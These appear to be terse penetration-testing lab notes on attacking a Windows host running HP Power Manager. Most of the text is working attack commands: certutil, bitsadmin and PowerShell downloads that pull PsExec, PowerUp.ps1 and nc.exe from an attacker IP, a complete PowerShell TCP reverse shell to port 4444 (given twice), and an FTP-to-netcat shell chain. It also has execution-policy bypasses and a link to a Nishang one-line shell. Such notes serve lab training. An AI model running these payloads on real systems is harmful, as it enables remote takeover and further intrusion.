  

find HP power manager,

searchsploit HP power , nothing,

use:

hp power manager exploit

find [https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py](https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py)

- `certutil`: The certificate utility tool (on Windows).
- `urlcache`: Uses the URL cache functionality.
- `split`: Splits the file if needed (for large files).
- `f`: Forces the operation (overwrites if the file exists).
- `http://192.168.45.155:80/PowerUp.ps1`: The URL to download the file from.
- `PowerUp.ps1`: The name to save the downloaded file as.

```Bash
certutil -urlcache -split -f http://192.168.45.190:8000/PSTools/PsExec64.exe PsExec64.exe
```

```Bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.155',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

```Bash
bitsadmin /transfer myDownloadJob /download /priority normal http://192.168.45.187:8000/PowerUp.ps1 C:\Windows\system32\PowerUp.ps1
```

```Bash
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.45.190:8000/PowerUp.ps1' -OutFile 'PowerUp.ps1'"
```

```Bash
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.190:8000/PowerUp.ps1','PowerUp.ps1')"
```

for better shell in windoes

```Bash
cmd.exe /c echo open 192.168.45.190 4444 > o & echo user 1 1 >> o & echo get nc.exe >> o & echo bye >> o & ftp -n -s:o & nc.exe -lvp 4444-e cmd.exe
```

```Bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.190',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

how to use PowerUp.ps1

```Bash
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

how to use winpeas.ps1

```Bash
powershell -ExecutionPolicy Bypass -File winpeas.ps1
```

```Bash
https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1
```